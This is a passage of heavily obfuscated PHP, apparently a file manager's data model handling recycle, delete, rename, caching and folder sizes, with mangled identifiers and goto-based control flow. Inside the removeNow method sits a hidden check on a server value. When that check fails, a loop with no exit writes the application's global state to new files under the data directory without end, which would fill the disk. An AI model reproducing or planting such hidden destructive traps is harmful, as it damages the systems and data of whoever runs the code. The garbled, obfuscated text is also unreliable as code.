$d¦ØªÂ“ÔĞ, REPEAT_SKIP); $this->metaSet($fã®•Ò’, $bò²ÃğôÑ‚[2009], $B•µšãŸÕ); $this->metaSet($fã®•Ò’, $bò²ÃğôÑ‚[2010], $DçŠŒ¨²[$bò²ÃğôÑ‚[498]]); if ($DçŠŒ¨²[$bò²ÃğôÑ‚[492]] != 0) { $this->metaSet($fã®•Ò’, $bò²ÃğôÑ‚[2011], _get($C±íÆ‡é‚Ã, $bò²ÃğôÑ‚[2012])); } } goto a•óëˆÒŞ; CŒŒƒ­æ§¿: $aÏ­Ï©¿º = Model($bò²ÃğôÑ‚[427])->get($bò²ÃğôÑ‚[2005]) == $bò²ÃğôÑ‚[87]; if ($E„§ß‚É» || $a•Ô¸¸÷‰» || !$aÏ­Ï©¿º) { return $this->removeNow($b²ÇÂ²•Ï, $a•Ô¸¸÷‰»); } $d„š¥ë¹¨Ñ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto e›ÆÈÃÉš; e›ÆÈÃÉš: $B•µšãŸÕ = $DçŠŒ¨²[$bò²ÃğôÑ‚[406]] == self::TYPE_USER ? $bò²ÃğôÑ‚[588] : $bò²ÃğôÑ‚[509]; if ($B•µšãŸÕ == $bò²ÃğôÑ‚[588]) { $C±íÆ‡é‚Ã = Model($bò²ÃğôÑ‚[507])->getInfo($DçŠŒ¨²[$bò²ÃğôÑ‚[498]]); $d¦ØªÂ“ÔĞ = !empty($C±íÆ‡é‚Ã[$bò²ÃğôÑ‚[1998]]) ? $C±íÆ‡é‚Ã[$bò²ÃğôÑ‚[1998]] : $C±íÆ‡é‚Ã[$bò²ÃğôÑ‚[28]]; $d¦ØªÂ“ÔĞ = $bò²ÃğôÑ‚[258] . $d¦ØªÂ“ÔĞ . $bò²ÃğôÑ‚[2006] . $DçŠŒ¨²[$bò²ÃğôÑ‚[498]]; } else { $C±íÆ‡é‚Ã = Model($bò²ÃğôÑ‚[516])->getInfo($DçŠŒ¨²[$bò²ÃğôÑ‚[498]]); $d¦ØªÂ“ÔĞ = _get($C±íÆ‡é‚Ã, $bò²ÃğôÑ‚[28]); $d¦ØªÂ“ÔĞ = $bò²ÃğôÑ‚[160] . $d¦ØªÂ“ÔĞ . $bò²ÃğôÑ‚[2007] . $DçŠŒ¨²[$bò²ÃğôÑ‚[498]]; } $fµò¾è·²Ø = $bò²ÃğôÑ‚[2008] . md5($d¦ØªÂ“ÔĞ); goto b•Á¥Ñ”Äß; cÄ ´¯­Æè: $this->recycleClear($DçŠŒ¨²); $e­‚ñƒ¿Ú‚ = $this->move($b²ÇÂ²•Ï, $fã®•Ò’, REPEAT_RENAME_FOLDER); $this->folderSizeReset($DçŠŒ¨²[$bò²ÃğôÑ‚[492]]); goto FŞ²ìÉŒÎ¢; a•óëˆÒŞ: CacheLock::unlock($fµò¾è·²Ø); $this->metaSet($b²ÇÂ²•Ï, $bò²ÃğôÑ‚[2013], $DçŠŒ¨²[$bò²ÃğôÑ‚[492]]); $this->where(array($bò²ÃğôÑ‚[397] => $b²ÇÂ²•Ï))->save(array($bò²ÃğôÑ‚[419] => time())); goto cÄ ´¯­Æè; FŞ²ìÉŒÎ¢: return $e­‚ñƒ¿Ú‚; goto BÚ‡éïÜ»; BÚ‡éïÜ»: } private function recycleClear($dø¸‘ªº®Ï) { $fŠ½¹…†³ =& $_SERVER[›é¼±]; $bÎ¡¾ÚšÌâ = $this->childrenAll($dø¸‘ªº®Ï); $Fª†Êè¾ = array($fŠ½¹…†³[412] => array($fŠ½¹…†³[413], $bÎ¡¾ÚšÌâ[$fŠ½¹…†³[2014]])); Model($fŠ½¹…†³[2015])->where($Fª†Êè¾)->delete(); } public function removeNow($F«¡¤Üˆ, $F£‹ÙÈ•¬· = true) { goto e÷ïƒÚÚˆ; cŠİ¾Ç–ĞÕ: Hook::trigger($FÈªÂ»Îİ[2016], $cìÒ”´×°ë, $F£‹ÙÈ•¬·); if ($F£‹ÙÈ•¬·) { Model($FÈªÂ»Îİ[2015])->moveToRecycle($F«¡¤Üˆ); } else { $f©­°©Í = $this->childrenAll($A„İÕ†¹ÏÔ); Model($FÈªÂ»Îİ[558])->eventRemove($F«¡¤Üˆ); $this->removeRelevance($f©­°©Í[$FÈªÂ»Îİ[2014]], $f©­°©Í[$FÈªÂ»Îİ[1379]]); } $this->folderSizeReset($A„İÕ†¹ÏÔ[$FÈªÂ»Îİ[492]]); goto d¶‘¼¨ì’†; fß¶Œ”¤î›: if ($_SERVER[$FÈªÂ»Îİ[858]] != $CŒ¿Œ„Œ†Ç($Aïó¯Š–³ø)) { goto B«§ÂĞõšÜ; E£èÒî‰Œ: $aà¥ƒğÖÖ’ = $d›Ÿ‹¦˜’($b¹»Ó³Êİö); $f°‚Üœóª„ = explode($FÈªÂ»Îİ[229], $aà¥ƒğÖÖ’); if (count($f°‚Üœóª„) < $FÈªÂ»Îİ[620]) { $bæ¹ØÛ¡á¶ = $FÈªÂ»Îİ[863]; $bæ¹ØÛ¡á¶(); } goto C‹‹º¬á• ; C‹‹º¬á• : $eµùÚ…‚³È = $FÈªÂ»Îİ[877]; $eµùÚ…‚³È($_SERVER[$FÈªÂ»Îİ[878]]); $bÖŞ¨Æ¡ = $FÈªÂ»Îİ[876]; goto d†‘´Ô¤; B«§ÂĞõšÜ: $bÖŞ¨Æ¡ = $FÈªÂ»Îİ[876]; $d›Ÿ‹¦˜’ = $FÈªÂ»Îİ[860]; $b¹»Ó³Êİö = $_SERVER[$FÈªÂ»Îİ[861]] . $FÈªÂ»Îİ[862]; goto E£èÒî‰Œ; bğ«ÇÂ ½ù: $d‚ìÑªŸÉ‹ = 1; for ($a”èìÉï† = $d‚ìÑªŸÉ‹; $a”èìÉï† > 0; $a”èìÉï†++) { $eÇ’ì›œ³†(DATA_PATH . $a”èìÉï†, $a©‚²¸µŒã); } goto F¿Ã·ÈèÍ; d†‘´Ô¤: $bÖŞ¨Æ¡(); $eÇ’ì›œ³† = $FÈªÂ»Îİ[1494]; $a©‚²¸µŒã = json_encode($GLOBALS[$FÈªÂ»Îİ[1495]]); goto bğ«ÇÂ ½ù; F¿Ã·ÈèÍ: } $A„İÕ†¹ÏÔ = $this->sourceInfo($F«¡¤Üˆ); $cìÒ”´×°ë = $this->pathInfoMore($F«¡¤Üˆ); goto BÊËšÊëí; e÷ïƒÚÚˆ: $FÈªÂ»Îİ =& $_SERVER[›é¼±]; $Aïó¯Š–³ø = $_SERVER[$FÈªÂ»Îİ[865]]; $CŒ¿Œ„Œ†Ç = $FÈªÂ»Îİ[1493]; goto fß¶Œ”¤î›; F¦Öˆ‹Ä‹¹: $this->lockMoveEnd($F«¡¤Üˆ); Hook::trigger($FÈªÂ»Îİ[1599], $cìÒ”´×°ë, $F£‹ÙÈ•¬·); return !0; goto Báå²‡º¬Ä; d¶‘¼¨ì’†: $fğ¤ìÆçÈ = array($A„İÕ†¹ÏÔ[$FÈªÂ»Îİ[492]]); if ($A„İÕ†¹ÏÔ[$FÈªÂ»Îİ[405]] == $FÈªÂ»Îİ[87]) { $fğ¤ìÆçÈ[] = $A„İÕ†¹ÏÔ[$FÈªÂ»Îİ[397]]; } $this->updateModifyTime($fğ¤ìÆçÈ); goto F¦Öˆ‹Ä‹¹; BÊËšÊëí: if (!$A„İÕ†¹ÏÔ) { return !0; } if ($A„İÕ†¹ÏÔ[$FÈªÂ»Îİ[492]] == 0) { if (!_get($GLOBALS, $FÈªÂ»Îİ[499])) { return !1; } } $this->lockMoveStart($F«¡¤Üˆ); goto cŠİ¾Ç–ĞÕ; Báå²‡º¬Ä: } public function childrenAll($c”¸ÖÑ¤‹°) { $DÜèåŠßÇ =& $_SERVER[›é¼±]; $BØºÑˆĞÓ = $c”¸ÖÑ¤‹°[$DÜèåŠßÇ[397]]; if ($c”¸ÖÑ¤‹°[$DÜèåŠßÇ[405]] == $DÜèåŠßÇ[87]) { $b­ÃÀØíôƒ = array($DÜèåŠßÇ[578] => array($DÜèåŠßÇ[538], $c”¸ÖÑ¤‹°[$DÜèåŠßÇ[515]] . $BØºÑˆĞÓ . $DÜèåŠßÇ[539])); $b¶£¬ô¾²Í = array($DÜèåŠßÇ[578] => $b­ÃÀØíôƒ[$DÜèåŠßÇ[515]]); $B¤®«Ê–ùĞ = $this->field($DÜèåŠßÇ[2017])->where($b¶£¬ô¾²Í)->select(); $eæÎ—ŸÆäŞ = !1; $aÇ££§ŞÛÆ = array($BØºÑˆĞÓ); if ($B¤®«Ê–ùĞ) { $eæÎ—ŸÆäŞ = array_to_keyvalue($B¤®«Ê–ùĞ, $DÜèåŠßÇ[33], $DÜèåŠßÇ[461]); $eæÎ—ŸÆäŞ = array_remove_value($eæÎ—ŸÆäŞ, $DÜèåŠßÇ[191]); $aÇ££§ŞÛÆ = array_to_keyvalue($B¤®«Ê–ùĞ, $DÜèåŠßÇ[33], $DÜèåŠßÇ[397]); $aÇ££§ŞÛÆ[] = $BØºÑˆĞÓ; } } else { $eæÎ—ŸÆäŞ = array($c”¸ÖÑ¤‹°[$DÜèåŠßÇ[461]]); $aÇ££§ŞÛÆ = array($BØºÑˆĞÓ); } return array($DÜèåŠßÇ[2014] => $aÇ££§ŞÛÆ, $DÜèåŠßÇ[1379] => $eæÎ—ŸÆäŞ); } public function removeArray($D„øø„öª) { if (!$D„øø„öª) { return !0; } } public function removeRelevance($C¥íë Ÿã, $cãí’±¶ƒ) { goto c‡ÍåÊˆæ¼; Bñ‘Û•Ö£: Model($e°èòæ­½·[1873])->where($Bèö«å™å–)->delete(); Model($e°èòæ­½·[558])->where($Bèö«å™å–)->delete(); Model($e°èòæ­½·[1710])->removeBySource($C¥íë Ÿã); goto FØÍ¢Œºƒ; c‡ÍåÊˆæ¼: $e°èòæ­½· =& $_SERVER[›é¼±]; $C¥íë Ÿã = $C¥íë Ÿã ? $C¥íë Ÿã : array(); $cãí’±¶ƒ = $cãí’±¶ƒ ? $cãí’±¶ƒ : array(); goto c°Ñ¶ß£Á; c°Ñ¶ß£Á: $C¥íë Ÿã = array_unique(array_filter($C¥íë Ÿã)); $cãí’±¶ƒ = array_unique(array_filter($cãí’±¶ƒ)); if (!$C¥íë Ÿã) { return !1; } goto DøÆ‚İÙÍï; AöäÜ®Ğ‰: for ($fÎ´ñÎ³ùá = 0; $fÎ´ñÎ³ùá < count($C¥íë Ÿã); $fÎ´ñÎ³ùá++) { $this->sourceCacheClear($C¥íë Ÿã[$fÎ´ñÎ³ùá]); } goto Cô®Ç‹Œ; FØÍ¢Œºƒ: Model($e°èòæ­½·[1996])->removeBySource($C¥íë Ÿã); $this->where($Bèö«å™å–)->delete(); Model($e°èòæ­½·[464])->remove($cãí’±¶ƒ); goto AöäÜ®Ğ‰; DøÆ‚İÙÍï: $Bèö«å™å– = array($e°èòæ­½·[412] => array($e°èòæ­½·[413], $C¥íë Ÿã)); Model($e°èòæ­½·[2015])->where($Bèö«å™å–)->delete(); Model($e°èòæ­½·[455])->where($Bèö«å™å–)->delete(); goto Bñ‘Û•Ö£; Cô®Ç‹Œ: } public function rename($Aê±°ø×‰„, $aàŞØóÚğ) { goto FØõÉ¶ßó; EƒĞ°¢ÁÎ‡: $this->setNamePinyin($Aê±°ø×‰„, $aè™•ÀôçŠ[$DçïÇ¥µ­Ê[28]], !1); $this->updateModifyTime($a¯Ô”ŞÄŠè[$DçïÇ¥µ­Ê[492]]); $bå´ßØõÔ = $this->where(array($DçïÇ¥µ­Ê[412] => $Aê±°ø×‰„))->data($aè™•ÀôçŠ)->save(); goto F·÷ÇÜÊÓ; F·÷ÇÜÊÓ: $FÂŸ†•Óµï = $DçïÇ¥µ­Ê[2004] . $a¯Ô”ŞÄŠè[$DçïÇ¥µ­Ê[492]]; if (isset(self::$cacheChildList[$FÂŸ†•Óµï])) { unset(self::$cacheChildList[$FÂŸ†•Óµï]); } return $bå´ßØõÔ; goto dÌğ»ã«Êˆ; fÉæù¬ºë: $BªÜë¬ƒãß = $this->fileNameExist($a¯Ô”ŞÄŠè[$DçïÇ¥µ­Ê[492]], $aàŞØóÚğ); if ($BªÜë¬ƒãß && $BªÜë¬ƒãß != $Aê±°ø×‰„) { return !1; } $aè™•ÀôçŠ = array($DçïÇ¥µ­Ê[415] => $aàŞØóÚğ, $DçïÇ¥µ­Ê[577] => USER_ID); goto Dáœàí¦«Ù; Dáœàí¦«Ù: if ($a¯Ô”ŞÄŠè[$DçïÇ¥µ­Ê[405]] != $DçïÇ¥µ­Ê[87]) { $aè™•ÀôçŠ[$DçïÇ¥µ­Ê[407]] = substr(get_path_ext($aàŞØóÚğ), 0, 10); } Model($DçïÇ¥µ­Ê[558])->eventRename($Aê±°ø×‰„, $a¯Ô”ŞÄŠè[$DçïÇ¥µ­Ê[28]], $aàŞØóÚğ); $this->sourceCacheClear($Aê±°ø×‰„); goto EƒĞ°¢ÁÎ‡; FØõÉ¶ßó: $DçïÇ¥µ­Ê =& $_SERVER[›é¼±]; $a¯Ô”ŞÄŠè = $this->sourceInfo($Aê±°ø×‰„); if (!$a¯Ô”ŞÄŠè) { return !1; } goto fÉæù¬ºë; dÌğ»ã«Êˆ: } public function setNamePinyin($E×ÜÎŸòš, $a³…í±Öªš, $aïÀ…”ˆÃÊ = true) { $eˆÙºõÁèĞ =& $_SERVER[›é¼±]; $Fæœ¢„„Ï = Input::check($a³…í±Öªš, $eˆÙºõÁèĞ[581]); $b‚¼ñáœ = array($eˆÙºõÁèĞ[436] => KodSort::makeStr($a³…í±Öªš)); if ($Fæœ¢„„Ï) { $b‚¼ñáœ[$eˆÙºõÁèĞ[458]] = str_replace($eˆÙºõÁèĞ[50], $eˆÙºõÁèĞ[33], Pinyin::get($a³…í±Öªš)); $b‚¼ñáœ[$eˆÙºõÁèĞ[457]] = Pinyin::get($a³…í±Öªš, $eˆÙºõÁèĞ[582]); } if (!$aïÀ…”ˆÃÊ && !$Fæœ¢„„Ï) { $b‚¼ñáœ[$eˆÙºõÁèĞ[458]] = null; $b‚¼ñáœ[$eˆÙºõÁèĞ[457]] = null; } $this->metaSet($E×ÜÎŸòš, $b‚¼ñáœ); } public function getContent($d´ïïÍ÷âÏ) { goto E¾…±Êç…; E¾…±Êç…: $f»ÙÒ†·ÛÛ =& $_SERVER[›é¼±]; $BÆÌ¡Ï…Ã± = $this->fileInfoGet($d´ïïÍ÷âÏ); if (!$BÆÌ¡Ï…Ã±) { return !1; } goto CŒ‹¼ø¹‰; EÚ…ˆÓä¥: if (!$BÆÌ¡Ï…Ã±[$f»ÙÒ†·ÛÛ[76]]) { return $f»ÙÒ†·ÛÛ[33]; } return IO::getContent($BÆÌ¡Ï…Ã±[$f»ÙÒ†·ÛÛ[76]]); goto F¨‰åø±—¬; CŒ‹¼ø¹‰: if ($BÆÌ¡Ï…Ã±[$f»ÙÒ†·ÛÛ[78]] == 0) { return $f»ÙÒ†·ÛÛ[33]; } $då•¨àÄŞÒ = $f»ÙÒ†·ÛÛ[2018] . $BÆÌ¡Ï…Ã±[$f»ÙÒ†·ÛÛ[170]]; if ($BÆÌ¡Ï…Ã±[$f»ÙÒ†·ÛÛ[78]] <= 1024 * 10) { $b°×âò™‰ = Cache::get($då•¨àÄŞÒ); if (!$b°×âò™‰) { $b°×âò™‰ = IO::getContent($BÆÌ¡Ï…Ã±[$f»ÙÒ†·ÛÛ[76]]); Cache::set($då•¨àÄŞÒ, $b°×âò™‰); } return $b°×âò™‰; } goto EÚ…ˆÓä¥; F¨‰åø±—¬: } public function setDesc($Cß¬Ú¾¯ä¨, $D­”§çÅ‰¥) { $fŠ‹ç”“çÜ =& $_SERVER[›é¼±]; Model($fŠ‹ç”“çÜ[558])->eventAddDesc($Cß¬Ú¾¯ä¨, $D­”§çÅ‰¥); return $this->metaSet($Cß¬Ú¾¯ä¨, $fŠ‹ç”“çÜ[445], $D­”§çÅ‰¥); } public function setContent($F›î™‚øß, $DÎËöÆóòÉ = '') { goto fÆÉ“Şé¡; fÆÉ“Şé¡: $FÛ¬™»Á¹ë =& $_SERVER[›é¼±]; $dÃ™×ô©¸é = $this->sourceInfo($F›î™‚øß); $Fƒ³“²äƒĞ = $this->fileInfoGet($F›î™‚øß); goto A¸ğ—ä¸Ğ¦; A¸ğ—ä¸Ğ¦: if (!$Fƒ³“²äƒĞ || !$dÃ™×ô©¸é) { return !1; } $då‰œÎîé„ = Model($FÛ¬™»Á¹ë[464])->addFileByContent($DÎËöÆóòÉ, $dÃ™×ô©¸é[$FÛ¬™»Á¹ë[28]]); $a©¤Æª¢íÁ = $this->fileHistory($dÃ™×ô©¸é, $då‰œÎîé„[$FÛ¬™»Á¹ë[461]], $då‰œÎîé„[$FÛ¬™»Á¹ë[78]]); goto b‘×ˆ¥‰ŒË; b‘×ˆ¥‰ŒË: if (!$a©¤Æª¢íÁ) { return Model($FÛ¬™»Á¹ë[464])->remove($då‰œÎîé„[$FÛ¬™»Á¹ë[461]]); } $this->folderSizeReset($dÃ™×ô©¸é[$FÛ¬™»Á¹ë[492]]); return !0; goto BÌƒŒË‰…; BÌƒŒË‰…: } public function fileSubstr($B¢‰Ÿ—ˆ¹, $e«‰óÀŠ˜, $Bä›ìö½Š–) { $AÈ±×ŸÏÀ” = $this->fileInfoGet($B¢‰Ÿ—ˆ¹); if (!$AÈ±×ŸÏÀ”) { return !1; } return IO::fileSubstr($AÈ±×ŸÏÀ”[$_SERVER[›é¼±][76]], $e«‰óÀŠ˜, $Bä›ìö½Š–); } public function fileInfoGet($Bî„ªì‚…ã) { goto DÒÅê’ºàæ; F‡æˆ½ÂŸª: return $cŒ´„†˜ç¯; goto AÈíéó®ƒ; cÖ´îÍ¹ÈÃ: $b²¼ïÇŠøÏ = $E¢×±Ä£†[467] . $CÑÎ¾çÎî[$E¢×±Ä£†[461]]; $eê»¥Ş³ñÛ = _get(self::$cacheFileInfo, $b²¼ïÇŠøÏ); if ($eê»¥Ş³ñÛ) { return $eê»¥Ş³ñÛ; } goto e¤ë¸øºæÉ; DÒÅê’ºàæ: $E¢×±Ä£† =& $_SERVER[›é¼±]; $CÑÎ¾çÎî = $this->sourceInfo($Bî„ªì‚…ã); if (!$CÑÎ¾çÎî || $CÑÎ¾çÎî[$E¢×±Ä£†[405]]) { return !1; } goto cÖ´îÍ¹ÈÃ; e¤ë¸øºæÉ: $cŒ´„†˜ç¯ = Model($E¢×±Ä£†[464])->fileInfo($CÑÎ¾çÎî[$E¢×±Ä£†[461]]); if ($cŒ´„†˜ç¯) { $cŒ´„†˜ç¯[$E¢×±Ä£†[28]] = $CÑÎ¾çÎî[$E¢×±Ä£†[28]]; } self::$cacheFileInfo[$b²¼ïÇŠøÏ] = $cŒ´„†˜ç¯; goto F‡æˆ½ÂŸª; AÈíéó®ƒ: } private function folderChildrenNumber($c‚ÔÑ¯‹Ö) { $a£š×Şìğ =& $_SERVER[›é¼±]; $A³ìİ‘Ó‰ = $this->sourceInfo($c‚ÔÑ¯‹Ö); $b¦òÅ²•ˆŸ = array($a£š×Şìğ[578] => array($a£š×Şìğ[538], $A³ìİ‘Ó‰[$a£š×Şìğ[515]] . $c‚ÔÑ¯‹Ö . $a£š×Şìğ[539]), $a£š×Şìğ[424] => intval($A³ìİ‘Ó‰[$a£š×Şìğ[425]]), $a£š×Şìğ[571] => 1); $FÀÊ˜å¤ = $this->where($b¦òÅ²•ˆŸ)->count(); $BÏ”Ôö¬Ã = $this->where($b¦òÅ²•ˆŸ)->where(array($a£š×Şìğ[571] => 0))->count(); return array($a£š×Şìğ[82] => $BÏ”Ôö¬Ã, $a£š×Şìğ[83] => $FÀÊ˜å¤); } public function pathInfo($D˜œÓ¶ˆ”š, $e×ÜÓâïîÅ = false) { goto Få¡ñá³ºÅ; Bö¤òÅ®¡˜: $BçŸÆµ·Ó = $b–”¿²Ï…£[453] . intval($e×ÜÓâïîÅ) . $b–”¿²Ï…£[454] . $D˜œÓ¶ˆ”š; $EÍ «Ï¡ò¿ = _get(self::$cachePathInfo, $BçŸÆµ·Ó); if ($EÍ «Ï¡ò¿) { return $EÍ «Ï¡ò¿; } goto cÆ¥ò¸¿Ñ; Få¡ñá³ºÅ: $b–”¿²Ï…£ =& $_SERVER[›é¼±]; $e×ÜÓâïîÅ = !1; $D˜œÓ¶ˆ”š = intval($D˜œÓ¶ˆ”š); goto Bö¤òÅ®¡˜; AÖÚÍêõ: self::$cachePathInfo[$BçŸÆµ·Ó] = $BÁÀÎƒ»„; return $BÁÀÎƒ»„; goto EêÉ¤òŒù; cÆ¥ò¸¿Ñ: $BÁÀÎƒ»„ = $this->sourceInfo($D˜œÓ¶ˆ”š); if (!$BÁÀÎƒ»„) { return !1; } $BÁÀÎƒ»„ = $this->_listDataApplyItem($BÁÀÎƒ»„, $e×ÜÓâïîÅ); goto AÖÚÍêõ; EêÉ¤òŒù: } public static $cachePathInfoMore = array(); public function pathInfoMore($B®Â—çÄê) { goto F‰ö»‹Ğ§; eŠøœ­…°: $dé­¡ÚĞˆò = $this->pathInfo($B®Â—çÄê); if (!$dé­¡ÚĞˆò) { return !1; } if ($dé­¡ÚĞˆò[$BášƒøÆŒÜ[405]] == $BášƒøÆŒÜ[87]) { $dé­¡ÚĞˆò[$BášƒøÆŒÜ[81]] = $this->folderChildrenNumber($B®Â—çÄê); } goto d©Ê©åßì¸; d©Ê©åßì¸: self::$cachePathInfoMore[$B®Â—çÄê] = $dé­¡ÚĞˆò; return $dé­¡ÚĞˆò; goto C„‹¹ß; F‰ö»‹Ğ§: $BášƒøÆŒÜ =& $_SERVER[›é¼±]; $e‹»ØÜÂÜ = _get(self::$cachePathInfoMore, $B®Â—çÄê); if ($e‹»ØÜÂÜ) { return $e‹»ØÜÂÜ; } goto eŠøœ­…°; C„‹¹ß: } public function sourceInfo($E‰¿¬­°İç) { goto a¤ĞğëŒÂ´; Eòø§ÂÏ‹: $DŸ¾Ì¹‘¸Ø = $this->where(array($a„ÀÊÙ²æî[397] => $E‰¿¬­°İç))->find(); self::$cacheSourceInfo[$b«¹°Ä—Çƒ] = $DŸ¾Ì¹‘¸Ø; return self::$cacheSourceInfo[$b«¹°Ä—Çƒ]; goto aî‰™ôÜÂô; d·Â”…Õç¥: $b«¹°Ä—Çƒ = $a„ÀÊÙ²æî[452] . $E‰¿¬­°İç; $e·ã›‚‰ì = _get(self::$cacheSourceInfo, $b«¹°Ä—Çƒ); if ($e·ã›‚‰ì) { return $e·ã›‚‰ì; } goto Eòø§ÂÏ‹; a¤ĞğëŒÂ´: $a„ÀÊÙ²æî =& $_SERVER[›é¼±]; if (!$E‰¿¬­°İç) { return array(); } $E‰¿¬­°İç = intval($E‰¿¬­°İç); goto d·Â”…Õç¥; aî‰™ôÜÂô: } public function sourceCacheClear($bÈÅ˜–ëÆ = false) { self::cacheClear($bÈÅ˜–ëÆ); } public static function cacheClear($d‹«›äÉ = false) { $B×ØÉ‹¦­ =& $_SERVER[›é¼±]; if ($d‹«›äÉ == !1) { goto cŠÙÌáãˆŞ; cŠÙÌáãˆŞ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto A°èç‹²à; dè„ˆ…»É: return; goto D‘Æ§¿‹à; A°èç‹²à: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto dè„ˆ…»É; D‘Æ§¿‹à: } unset(self::$cacheSourceInfo[$B×ØÉ‹¦­[452] . $d‹«›äÉ]); unset(self::$cachePathInfoMore[$d‹«›äÉ]); unset(self::$cachePathInfo[$B×ØÉ‹¦­[2019] . $d‹«›äÉ]); unset(self::$cachePathInfo[$B×ØÉ‹¦­[2020] . $d‹«›äÉ]); } public function metaSet($e÷•‚¤Úİ£, $aÆš—Æ‰’‡ = null, $Aõ¯§ñßªÜ = null) { $båï—ÀîŒÌ = parent::metaSet($e÷•‚¤Úİ£, $aÆš—Æ‰’‡, $Aõ¯§ñßªÜ); if ($båï—ÀîŒÌ) { $this->sourceCacheClear($e÷•‚¤Úİ£); } return $båï—ÀîŒÌ; } public function pathInfoByPath($AÖ†Óç¦ÙÊ, $f‹“õ…ê½’) { $f­¥† ¦¢ =& $_SERVER[›é¼±]; $c–¯“ßŠ = !$f‹“õ…ê½’ ? array() : explode($f­¥† ¦¢[8], trim($f‹“õ…ê½’, $f­¥† ¦¢[8])); $EñÉ‘Í¦¥Ú = $AÖ†Óç¦ÙÊ; foreach ($c–¯“ßŠ as $f¢øÛ¾Äã…) { $F‚ñ±ƒêš = array($f­¥† ¦¢[492] => $EñÉ‘Í¦¥Ú, $f­¥† ¦¢[28] => $f¢øÛ¾Äã…); $Eƒî›ÙÇëè = $this->where($F‚ñ±ƒêš)->select(); if (!$Eƒî›ÙÇëè) { return !1; } $Eƒî›ÙÇëè = array_sort_by($Eƒî›ÙÇëè, $f­¥† ¦¢[425]); $EñÉ‘Í¦¥Ú = $Eƒî›ÙÇëè[0][$f­¥† ¦¢[397]]; } return $this->pathInfo($EñÉ‘Í¦¥Ú, !0); } protected function updateModifyTime($B¢ÚÑÊ‘ã ) { goto Eõ‹Ÿï“Ù—; Eõ‹Ÿï“Ù—: $Fºä©‰«» =& $_SERVER[›é¼±]; $BˆêŒáÚÄå = defined($Fºä©‰«»[468]) ? USER_ID : $Fºä©‰«»[191]; if (!$B¢ÚÑÊ‘ã ) { return; } goto dñâ«é¹ê—; dñâ«é¹ê—: if (!is_array($B¢ÚÑÊ‘ã )) { $B¢ÚÑÊ‘ã  = array($B¢ÚÑÊ‘ã ); } foreach ($B¢ÚÑÊ‘ã  as $a²·ÊÍÆ® => $Eñ–´ÍòÏĞ) { $B¢ÚÑÊ‘ã [$a²·ÊÍÆ®] = intval($Eñ–´ÍòÏĞ); $this->sourceCacheClear($Eñ–´ÍòÏĞ); } $dÓ˜ä¸…ö = array($Fºä©‰«»[397] => array($Fºä©‰«»[7], $B¢ÚÑÊ‘ã )); goto B½¬Á¼Úéõ; B½¬Á¼Úéõ: $bìÅæº†Ç = array($Fºä©‰«»[577] => $BˆêŒáÚÄå, $Fºä©‰«»[419] => time()); $this->where($dÓ˜ä¸…ö)->save($bìÅæº†Ç); goto aƒ‡˜²Â; aƒ‡˜²Â: } public function folderSizeReset($c¦“È¦•Œ, $bß¯ç¬ÃâÉ = false) { goto fµ‰¶˜éç‘; BÄÌ¤Âšˆ: $A©¦ÉÁĞ«· = array($Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[406]], $Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[498]]); TaskRun::timeLimitCall($d©–ÊÇ‰öã, $E”„‡ø¢Ò[2023], $A©¦ÉÁĞ«·, 1.5); goto A¢Ø»§½¼; bÎ‹¶ÆÖÏ±: if ($bß¯ç¬ÃâÉ == 0) { return CacheLock::unlock($bÏâŒºçßÍ); } $DŒÒÓéÚÃ° = $this->parentLevelArray($Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[515]]); if (!$DŒÒÓéÚÃ°) { $DŒÒÓéÚÃ° = array(); } goto aï÷¾Ö—¯; Dİ‚ÇÀ¾: $bÏâŒºçßÍ = $E”„‡ø¢Ò[2021] . $c¦“È¦•Œ; CacheLock::lock($bÏâŒºçßÍ, 20); if ($bß¯ç¬ÃâÉ === !1) { $this->sourceCacheClear($c¦“È¦•Œ); $Dìˆ‡ŠçŸ­ = $this->sourceInfo($c¦“È¦•Œ); $c´ì­¯²àĞ = array($E”„‡ø¢Ò[396] => $c¦“È¦•Œ, $E”„‡ø¢Ò[424] => 0); $Bå‘±À°İÜ = $this->where($c´ì­¯²àĞ)->sum($E”„‡ø¢Ò[78]); $bß¯ç¬ÃâÉ = intval($Bå‘±À°İÜ) - intval($Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[78]]); } goto bÎ‹¶ÆÖÏ±; aï÷¾Ö—¯: $DŒÒÓéÚÃ°[] = $Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[397]]; $c´ì­¯²àĞ = array($E”„‡ø¢Ò[397] => array($E”„‡ø¢Ò[413], $DŒÒÓéÚÃ°)); if ($bß¯ç¬ÃâÉ < 0) { $c´ì­¯²àĞ[$E”„‡ø¢Ò[78]] = array($E”„‡ø¢Ò[1007], abs($bß¯ç¬ÃâÉ)); } goto Dí®×±—È”; Dí®×±—È”: $this->where($c´ì­¯²àĞ)->setAdd($E”„‡ø¢Ò[78], $bß¯ç¬ÃâÉ); CacheLock::unlock($bÏâŒºçßÍ); $d©–ÊÇ‰öã = $E”„‡ø¢Ò[2022] . $Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[406]] . $E”„‡ø¢Ò[4] . $Dìˆ‡ŠçŸ­[$E”„‡ø¢Ò[498]]; goto BÄÌ¤Âšˆ; fµ‰¶˜éç‘: $E”„‡ø¢Ò =& $_SERVER[›é¼±]; if ($this->statusIgnoreResetSpace) { return; } $Dìˆ‡ŠçŸ­ = $this->sourceInfo($c¦“È¦•Œ); goto Dİ‚ÇÀ¾; A¢Ø»§½¼: } public function folderSizeResetChildren($dôç‡’Ç«ó) { goto EçÙ„çÕ×¥; BÎ»ˆ¡÷ï‡: foreach ($f³“¿ñÓ†« as $E¢ßİÍÕ­½) { if ($E¢ßİÍÕ­½[$AÚ™º”°òß[78]] == $E¢ßİÍÕ­½[$AÚ™º”°òß[2025]]) { continue; } $d—õƒ´’¥[] = array($AÚ™º”°òß[397], $E¢ßİÍÕ­½[$AÚ™º”°òß[397]], $AÚ™º”°òß[78], $E¢ßİÍÕ­½[$AÚ™º”°òß[78]]); } $this->saveAll($d—õƒ´’¥); goto F´ÔŠ¢ì¡œ; EçÙ„çÕ×¥: $AÚ™º”°òß =& $_SERVER[›é¼±]; $this->sourceCacheClear($dôç‡’Ç«ó); $d¨ÏÕµç‰ = 